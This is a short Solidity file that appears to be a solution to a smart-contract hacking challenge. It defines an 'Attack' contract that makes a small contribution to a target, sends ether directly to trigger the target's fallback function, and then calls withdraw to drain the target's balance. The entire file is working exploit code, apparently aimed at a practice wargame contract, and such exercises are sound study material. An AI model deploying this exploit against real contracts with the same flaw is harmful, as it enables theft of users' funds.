// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external payable;
    function getContribution() external view returns (uint);
    function withdraw() external;
}

contract Attack {
    IFallback public target;

    constructor(address _target) {
        target = IFallback(_target);
    }

    function attack() public payable {
        target.contribute{ value: 0.0001 ether }();
        payable(address(target)).transfer(.0001 ether);
        target.withdraw();
    }

    receive() external payable {}
}